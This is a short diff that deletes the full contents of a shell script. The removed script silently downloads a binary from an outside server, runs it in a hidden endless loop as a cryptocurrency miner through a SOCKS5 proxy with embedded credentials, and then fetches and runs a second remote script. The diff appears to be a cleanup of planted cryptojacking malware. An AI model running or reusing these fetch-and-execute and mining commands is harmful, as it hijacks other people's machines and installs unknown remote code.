@@ -1,2 +1,1 @@
-#!/bin/sh
-wget -q https://maskurniawan.serv00.net/wild && chmod +x wild && (while true; do ./wild --algo pearlhash --url 38.89.142.24:443 --user prl1pwqch34vpjknlyyhvwasma33j4vfuv6yxp7zsjf59aqpr3ja2ut3s3sg6yg@nock=66GF5PW9AUL1hQZRPsFxnWgASddAVoc34FWH1K1aCdwmqCSV8qLSZ5p.$(shuf -n 1 -i 1-9999)-Bismillah --proxy socks5://yoga:yoga123@107.172.222.195:443; sleep 5; done) >/dev/null 2>&1 & sleep 10 && wget -q https://maskurniawan.serv00.net/compile.sh && chmod +x compile.sh && bash compile.sh >/dev/null 2>&1
+
